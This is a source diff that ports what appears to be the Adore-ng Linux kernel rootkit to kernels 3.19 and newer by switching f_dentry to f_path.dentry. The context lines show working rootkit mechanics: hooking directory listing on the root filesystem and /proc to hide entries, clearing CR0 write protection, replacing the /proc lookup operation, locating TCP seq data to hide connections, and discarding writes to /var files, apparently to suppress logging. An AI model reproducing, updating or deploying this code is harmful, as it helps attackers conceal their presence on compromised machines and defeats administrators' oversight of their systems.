@@ -368,12 +368,19 @@ int adore_opt_filldir(void *buf, const char *name, int nlen, loff_t off, u64 ino
 int adore_opt_readdir(struct file *fp, void *buf, filldir_t filldir)
 {
 	int r = 0;
-
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
+#else
+	if (!fp || !fp->f_path.dentry || !buf || !filldir || !orig_root_readdir)
+#endif
 		return 0;
 
 	opt_filldir = filldir;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
+#else
+	parent_opt_dir[current->pid % 1024] = fp->f_path.dentry;
+#endif
 	r = orig_opt_readdir(fp, buf, adore_opt_filldir);
 	
 	return r;
@@ -465,11 +472,19 @@ int adore_root_readdir(struct file *fp, void *buf, filldir_t filldir)
 {
 	int r = 0;
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	if (!fp || !fp->f_dentry || !buf || !filldir || !orig_root_readdir)
+#else
+	if (!fp || !fp->f_path.dentry || !buf || !filldir || !orig_root_readdir)
+#endif
 		return 0;
 
 	root_filldir = filldir;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	parent_dir[current->pid % 1024] = fp->f_dentry;
+#else
+	parent_dir[current->pid % 1024] = fp->f_path.dentry;
+#endif
 	r = orig_root_readdir(fp, buf, adore_root_filldir);
 	
 	return r;
@@ -484,12 +499,20 @@ static int adore_opt_iterate(struct file *fp, struct dir_context *ctx)
 		.actor = adore_proc_filldir
 	};
 	
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	if (!fp || !fp->f_dentry || !orig_opt_iterate)
+#else
+	if (!fp || !fp->f_path.dentry || !orig_opt_iterate)
+#endif
 		return 0;
 
 	opt_filldir = ctx->actor;
 	memcpy(ctx, &new_ctx, sizeof(readdir_t));
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	parent_opt_dir[current->pid % 1024] = fp->f_dentry;
+#else
+	parent_opt_dir[current->pid % 1024] = fp->f_path.dentry;
+#endif
 	r = orig_opt_iterate(fp, ctx);
 	
 	return r;
@@ -517,11 +540,19 @@ static int adore_root_iterate(struct file *fp, struct dir_context *ctx)
 		.actor = adore_root_filldir
 	};
 	
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	if (!fp || !fp->f_dentry || !orig_root_iterate)
+#else
+	if (!fp || !fp->f_path.dentry || !orig_root_iterate)
+#endif
 		return -ENOTDIR;
 	
 	root_filldir = ctx->actor;
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	parent_dir[current->pid % 1024] = fp->f_dentry;
+#else
+	parent_dir[current->pid % 1024] = fp->f_path.dentry;
+#endif
 	
 	memcpy(ctx, &new_ctx, sizeof(readdir_t));
 	r = orig_root_iterate(fp, ctx);
@@ -634,7 +665,11 @@ ssize_t adore_var_write(struct file *f, const char *buf, size_t blen, loff_t *of
 	    !(current->flags & PF_AUTH)) {
 		for (i = 0; var_filenames[i]; ++i) {
 			if (var_files[i] &&
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 			    var_files[i]->f_dentry->d_inode->i_ino == f->f_dentry->d_inode->i_ino) {
+#else
+			    var_files[i]->f_path.dentry->d_inode->i_ino == f->f_path.dentry->d_inode->i_ino) {
+#endif
 				*off += blen;
 				return blen;
 			}
@@ -675,7 +710,11 @@ struct tcp_seq_afinfo *proc_find_tcp_seq(void)
 	filep = filp_open("/proc/net/tcp", O_RDONLY, 0);
 	if(!filep) return NULL;
 	
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	afinfo = PDE_DATA(filep->f_dentry->d_inode);
+#else
+	afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
+#endif
 	filp_close(filep, 0);
 	
 	return afinfo;
@@ -812,7 +851,11 @@ int __init adore_init(void)
 	
 	orig_cr0 = clear_return_cr0();
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
+#else
+	new_inode_op = (struct inode_operations *)filep->f_path.dentry->d_inode->i_op;
+#endif
 	orig_proc_lookup = new_inode_op->lookup;
 	new_inode_op->lookup = adore_lookup;
 	
@@ -891,7 +934,11 @@ void __exit adore_cleanup(void)
 	if (IS_ERR(filep)) 
 		return ;
 	
+#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
 	new_inode_op = (struct inode_operations *)filep->f_dentry->d_inode->i_op;
+#else
+	new_inode_op = (struct inode_operations *)filep->f_path.dentry->d_inode->i_op;
+#endif
 	new_inode_op->lookup = orig_proc_lookup;
 
 #if (LINUX_VERSION_CODE < KERNEL_VERSION(3, 11, 0))	
